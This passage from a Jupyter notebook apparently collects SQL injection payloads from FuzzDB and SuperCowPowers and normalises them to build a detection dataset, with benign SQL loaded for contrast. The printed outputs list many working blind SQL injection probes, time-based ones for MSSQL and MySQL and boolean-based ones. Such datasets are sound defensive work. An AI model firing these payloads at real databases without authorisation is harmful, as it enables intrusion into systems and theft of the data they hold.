       " \"  )  )  ;waitfor delay '0:0:__TIME__'--\",\n",
       " \"'  )  )  ;waitfor delay '0:0:__TIME__'--\"]"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "FuzzDB_GenericBlind= cleanData(sqliList)\n",
    "FuzzDB_GenericBlind[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3.2) payloads-sql-blind-MSSQL-INSERT\n",
    "\n",
    "source: https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/FuzzDB/payloads-sql-blind-MSSQL-INSERT.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\")%20waitfor%20delay%20'0:0:20'%20/*\\n\",\n",
       " \")%20waitfor%20delay%20'0:0:20'%20--\\n\",\n",
       " \"')%20waitfor%20delay%20'0:0:20'%20/*\\n\",\n",
       " \"')%20waitfor%20delay%20'0:0:20'%20--\\n\",\n",
       " '\")%20waitfor%20delay%20\\'0:0:20\\'%20/*\\n',\n",
       " '\")%20waitfor%20delay%20\\'0:0:20\\'%20--\\n',\n",
       " \"))%20waitfor%20delay%20'0:0:20'%20/*\\n\",\n",
       " \"))%20waitfor%20delay%20'0:0:20'%20--\\n\",\n",
       " \"'))%20waitfor%20delay%20'0:0:20'%20/*\\n\",\n",
       " \"'))%20waitfor%20delay%20'0:0:20'%20--\\n\",\n",
       " '\"))%20waitfor%20delay%20\\'0:0:20\\'%20/*\\n',\n",
       " '\"))%20waitfor%20delay%20\\'0:0:20\\'%20--\\n',\n",
       " \",NULL)%20waitfor%20delay%20'0:0:20'%20/*\\n\",\n",
       " \",NULL)%20waitfor%20delay%20'0:0:20'%20--\\n\",\n",
       " \"',NULL)%20waifor%20delay%20'0:0:20'%20/*\\n\",\n",
       " \"',NULL)%20waitfor%20delay%20'0:0:20'%20--\\n\",\n",
       " '\",NULL)%20waitfor%20delay%20\\'0:0:20\\'%20/*\\n',\n",
       " '\",NULL)%20waitfor%20delay%20\\'0:0:20\\'%20--\\n',\n",
       " \"),NULL)%20waitfor%20delay%20'0:0:20'%20/*\\n\",\n",
       " \"),NULL)%20waitfor%20delay%20'0:0:20'%20--\\n\"]"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" )  waitfor delay '0:0:20' /*\",\n",
       " \" )  waitfor delay '0:0:20' --\",\n",
       " \"' )  waitfor delay '0:0:20' /*\",\n",
       " \"' )  waitfor delay '0:0:20' --\",\n",
       " '\" )  waitfor delay \\'0:0:20\\' /*',\n",
       " '\" )  waitfor delay \\'0:0:20\\' --',\n",
       " \"  )  )   waitfor delay '0:0:20' /*\",\n",
       " \"  )  )   waitfor delay '0:0:20' --\",\n",
       " \"'  )  )   waitfor delay '0:0:20' /*\",\n",
       " \"'  )  )   waitfor delay '0:0:20' --\",\n",
       " '\"  )  )   waitfor delay \\'0:0:20\\' /*',\n",
       " '\"  )  )   waitfor delay \\'0:0:20\\' --',\n",
       " \",NULL )  waitfor delay '0:0:20' /*\",\n",
       " \",NULL )  waitfor delay '0:0:20' --\",\n",
       " \"',NULL )  waifor delay '0:0:20' /*\",\n",
       " \"',NULL )  waitfor delay '0:0:20' --\",\n",
       " '\",NULL )  waitfor delay \\'0:0:20\\' /*',\n",
       " '\",NULL )  waitfor delay \\'0:0:20\\' --',\n",
       " \" ) ,NULL )  waitfor delay '0:0:20' /*\",\n",
       " \" ) ,NULL )  waitfor delay '0:0:20' --\"]"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "FuzzDB_payloads_sql_blind_MSSQL_INSERT= cleanData(sqliList)\n",
    "FuzzDB_payloads_sql_blind_MSSQL_INSERT[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3.3) payloads-sql-blind-MSSQL-WHERE\n",
    "\n",
    "source: https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-WHERE.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/FuzzDB/payloads-sql-blind-MSSQL-WHERE.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" waitfor delay '0:0:20' /* \\n\",\n",
       " \" waitfor delay '0:0:20' --\\n\",\n",
       " \"' waitfor delay '0:0:20' /* \\n\",\n",
       " \"' waitfor delay '0:0:20' --\\n\",\n",
       " '\" waitfor delay \\'0:0:20\\' /* \\n',\n",
       " '\" waitfor delay \\'0:0:20\\' --\\n',\n",
       " \") waitfor delay '0:0:20' /* \\n\",\n",
       " \") waitfor delay '0:0:20' --\\n\",\n",
       " \")) waitfor delay '0:0:20' /* \\n\",\n",
       " \")) waitfor delay '0:0:20' --\\n\",\n",
       " \"))) waitfor delay '0:0:20' /* \\n\",\n",
       " \"))) waitfor delay '0:0:20' --\\n\",\n",
       " \")))) waitfor delay '0:0:20' /* \\n\",\n",
       " \")))) waitfor delay '0:0:20' --\\n\",\n",
       " \"))))) waitfor delay '0:0:20' --\\n\",\n",
       " \")))))) waitfor delay '0:0:20' --\\n\",\n",
       " \"') waitfor delay '0:0:20' /* \\n\",\n",
       " \"') waitfor delay '0:0:20' --\\n\",\n",
       " '\") waitfor delay \\'0:0:20\\' /* \\n',\n",
       " '\") waitfor delay \\'0:0:20\\' --\\n']"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" waitfor delay '0:0:20' /* \",\n",
       " \" waitfor delay '0:0:20' --\",\n",
       " \"' waitfor delay '0:0:20' /* \",\n",
       " \"' waitfor delay '0:0:20' --\",\n",
       " '\" waitfor delay \\'0:0:20\\' /* ',\n",
       " '\" waitfor delay \\'0:0:20\\' --',\n",
       " \" )  waitfor delay '0:0:20' /* \",\n",
       " \" )  waitfor delay '0:0:20' --\",\n",
       " \"  )  )   waitfor delay '0:0:20' /* \",\n",
       " \"  )  )   waitfor delay '0:0:20' --\",\n",
       " \"  )  )   )  waitfor delay '0:0:20' /* \",\n",
       " \"  )  )   )  waitfor delay '0:0:20' --\",\n",
       " \"  )  )    )  )   waitfor delay '0:0:20' /* \",\n",
       " \"  )  )    )  )   waitfor delay '0:0:20' --\",\n",
       " \"  )  )    )  )   )  waitfor delay '0:0:20' --\",\n",
       " \"  )  )    )  )    )  )   waitfor delay '0:0:20' --\",\n",
       " \"' )  waitfor delay '0:0:20' /* \",\n",
       " \"' )  waitfor delay '0:0:20' --\",\n",
       " '\" )  waitfor delay \\'0:0:20\\' /* ',\n",
       " '\" )  waitfor delay \\'0:0:20\\' --']"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "FuzzDB_payloads_sql_blind_MSSQL_WHERE= cleanData(sqliList)\n",
    "FuzzDB_payloads_sql_blind_MSSQL_WHERE[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3.4) payloads-sql-blind-MySQL-INSERT\n",
    "\n",
    "source: https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/FuzzDB/payloads-sql-blind-MySQL-INSERT.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*\\n',\n",
       " '+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--\\n',\n",
       " '+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23\\n',\n",
       " \"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*\\n\",\n",
       " \"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--\\n\",\n",
       " \"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23\\n\",\n",
       " '\"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*\\n',\n",
       " '\"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--\\n',\n",
       " '\"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23\\n',\n",
       " '+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* \\n',\n",
       " '+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--\\n',\n",
       " '+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23\\n',\n",
       " \"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* \\n\",\n",
       " \"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--\\n\",\n",
       " \"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23\\n\",\n",
       " '\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* \\n',\n",
       " '\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--\\n',\n",
       " '\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23\\n',\n",
       " '+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*\\n',\n",
       " '+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--\\n']"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL  )  )   /*',\n",
       " '+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL  )  )   --',\n",
       " '+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL  )  )   %23',\n",
       " \"'+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL  )  )   /*\",\n",
       " \"'+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL  )  )   --\",\n",
       " \"'+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL  )  )   %23\",\n",
       " '\"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL  )  )   /*',\n",
       " '\"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL  )  )   --',\n",
       " '\"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL  )  )   %23',\n",
       " '+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  /* ',\n",
       " '+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  --',\n",
       " '+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  %23',\n",
       " \"'+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  /* \",\n",
       " \"'+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  --\",\n",
       " \"'+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  %23\",\n",
       " '\"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  /* ',\n",
       " '\"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  --',\n",
       " '\"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL )  %23',\n",
       " '+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL,NULL )  /*',\n",
       " '+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL,NULL )  --']"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "FuzzDB_payloads_sql_blind_MySQL_INSERT= cleanData(sqliList)\n",
    "FuzzDB_payloads_sql_blind_MySQL_INSERT[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3.5) payloads-sql-blind-MySQL-ORDER-BY\n",
    "\n",
    "source: https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/FuzzDB/payloads-sql-blind-MySQL-ORDER_BY.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*\\n',\n",
       " ',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--\\n',\n",
       " ',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23\\n',\n",
       " \"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*\\n\",\n",
       " \"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--\\n\",\n",
       " \"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23\\n\",\n",
       " '\",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*\\n',\n",
       " '\",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--\\n',\n",
       " '\",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23\\n',\n",
       " '),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*\\n',\n",
       " '),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--\\n',\n",
       " '),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23\\n',\n",
       " \"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*\\n\",\n",
       " \"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--\\n\",\n",
       " \"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23\\n\",\n",
       " '\"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*\\n',\n",
       " '\"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--\\n',\n",
       " '\"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23\\n']"
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[', ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  /*',\n",
       " ', ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  --',\n",
       " ', ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  %23',\n",
       " \"', ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  /*\",\n",
       " \"', ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  --\",\n",
       " \"', ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  %23\",\n",
       " '\", ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  /*',\n",
       " '\", ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  --',\n",
       " '\", ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  %23',\n",
       " ' ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  /*',\n",
       " ' ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  --',\n",
       " ' ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  %23',\n",
       " \"' ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  /*\",\n",
       " \"' ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  --\",\n",
       " \"' ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  %23\",\n",
       " '\" ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  /*',\n",
       " '\" ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  --',\n",
       " '\" ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  %23']"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "FuzzDB_payloads_sql_blind_MySQL_ORDER_BY= cleanData(sqliList)\n",
    "FuzzDB_payloads_sql_blind_MySQL_ORDER_BY[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3.6) payloads-sql-blind-MySQL-WHERE\n",
    "\n",
    "source: https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/FuzzDB/payloads-sql-blind-MySQL-WHERE.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' and 0=benchmark(3000000,MD5(1))%20/*\\n',\n",
       " ' and 0=benchmark(3000000,MD5(1))%20--\\n',\n",
       " ' and 0=benchmark(3000000,MD5(1))%20%23\\n',\n",
       " \"' and 0=benchmark(3000000,MD5(1))%20/*\\n\",\n",
       " \"' and 0=benchmark(3000000,MD5(1))%20--\\n\",\n",
       " \"' and 0=benchmark(3000000,MD5(1))%20%23\\n\",\n",
       " '\" and 0=benchmark(3000000,MD5(1))%20/*\\n',\n",
       " '\" and 0=benchmark(3000000,MD5(1))%20--\\n',\n",
       " '\" and 0=benchmark(3000000,MD5(1))%20%23\\n',\n",
       " ') and 0=benchmark(3000000,MD5(1))%20/*\\n',\n",
       " ') and 0=benchmark(3000000,MD5(1))%20--\\n',\n",
       " ') and 0=benchmark(3000000,MD5(1))%20%23\\n',\n",
       " ')) and 0=benchmark(3000000,MD5(1))%20/*\\n',\n",
       " ')) and 0=benchmark(3000000,MD5(1))%20--\\n',\n",
       " ')) and 0=benchmark(3000000,MD5(1))%20%23\\n',\n",
       " '))) and 0=benchmark(3000000,MD5(1))%20/*\\n',\n",
       " '))) and 0=benchmark(3000000,MD5(1))%20--\\n',\n",
       " '))) and 0=benchmark(3000000,MD5(1))%20%23\\n',\n",
       " ')))) and 0=benchmark(3000000,MD5(1))%20/*\\n',\n",
       " ')))) and 0=benchmark(3000000,MD5(1))%20--\\n']"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*',\n",
       " ' and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --',\n",
       " ' and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23',\n",
       " \"' and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*\",\n",
       " \"' and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --\",\n",
       " \"' and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23\",\n",
       " '\" and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*',\n",
       " '\" and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --',\n",
       " '\" and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23',\n",
       " ' )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*',\n",
       " ' )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --',\n",
       " ' )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23',\n",
       " '  )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*',\n",
       " '  )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --',\n",
       " '  )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23',\n",
       " '  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*',\n",
       " '  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --',\n",
       " '  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23',\n",
       " '  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*',\n",
       " '  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --']"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "FuzzDB_payloads_sql_blind_MySQL_WHERE= cleanData(sqliList)\n",
    "FuzzDB_payloads_sql_blind_MySQL_WHERE[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 4) SuperCowPowers :"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "4.1) SQL_3\n",
    "\n",
    "source: https://github.com/SuperCowPowers/data_hacking/blob/master/sql_injection/data/SQL_3.txt\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/SuperCowPowers/SQL_3.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[') AND 93=93\\n',\n",
       " ') AND 9170=2793\\n',\n",
       " \"') AND 7364=5114\\n\",\n",
       " \"') AND 93=93\\n\",\n",
       " \"') AND 4731=891\\n\",\n",
       " \"' AND 5874=2869\\n\",\n",
       " \"' AND 93=93\\n\",\n",
       " \"' AND 529=7832\\n\",\n",
       " '\" AND 5183=1335\\n',\n",
       " '\" AND 93=93\\n',\n",
       " '\" AND 5984=4419\\n',\n",
       " ') AND 8703=8428 AND (7243=7243\\n',\n",
       " ') AND 93=93 AND (5302=5302\\n',\n",
       " ') AND 8117=9417 AND (1286=1286\\n',\n",
       " ')) AND 3196=7637 AND ((6424=6424\\n',\n",
       " ')) AND 93=93 AND ((1849=1849\\n',\n",
       " ')) AND 4113=33 AND ((6244=6244\\n',\n",
       " '))) AND 7371=4214 AND (((6219=6219\\n',\n",
       " '))) AND 93=93 AND (((2816=2816\\n',\n",
       " '))) AND 9563=2025 AND (((4031=4031\\n']"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' )  AND 93 = 93',\n",
       " ' )  AND 9170 = 2793',\n",
       " \"' )  AND 7364 = 5114\",\n",
       " \"' )  AND 93 = 93\",\n",
       " \"' )  AND 4731 = 891\",\n",
       " \"' AND 5874 = 2869\",\n",
       " \"' AND 93 = 93\",\n",
       " \"' AND 529 = 7832\",\n",
       " '\" AND 5183 = 1335',\n",
       " '\" AND 93 = 93',\n",
       " '\" AND 5984 = 4419',\n",
       " ' )  AND 8703 = 8428 AND  ( 7243 = 7243',\n",
       " ' )  AND 93 = 93 AND  ( 5302 = 5302',\n",
       " ' )  AND 8117 = 9417 AND  ( 1286 = 1286',\n",
       " '  )  )   AND 3196 = 7637 AND   (  (  6424 = 6424',\n",
       " '  )  )   AND 93 = 93 AND   (  (  1849 = 1849',\n",
       " '  )  )   AND 4113 = 33 AND   (  (  6244 = 6244',\n",
       " '  )  )   )  AND 7371 = 4214 AND   (  (   ( 6219 = 6219',\n",
       " '  )  )   )  AND 93 = 93 AND   (  (   ( 2816 = 2816',\n",
       " '  )  )   )  AND 9563 = 2025 AND   (  (   ( 4031 = 4031']"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "SuperPowers_SQL_3= cleanData(sqliList)\n",
    "SuperPowers_SQL_3[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "4.2) legit Data\n",
    "\n",
    "source: https://github.com/SuperCowPowers/data_hacking/blob/master/sql_injection/data/legit.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [],
   "source": [
    "#read benign data\n",
    "path='./dataset/collected payloads/SuperCowPowers'\n",
    "file=\"legit.txt\"\n",
    "df = pd.read_csv(os.path.join(path, file), sep='Aw3s0meSc0t7', names=['benign'], header=None, engine='python',  encoding=\"utf8\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>benign</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>ALTER SYSTEM FLUSH SHARED_POOL</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>ALTER TABLE metadatacollectionschema.altidcoll...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>ALTER TABLE metadatacollectionschema.andsactiv...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>ALTER TABLE metadatacollectionschema.andsparty...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>ALTER TABLE metadatacollectionschema.andsservi...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                              benign\n",
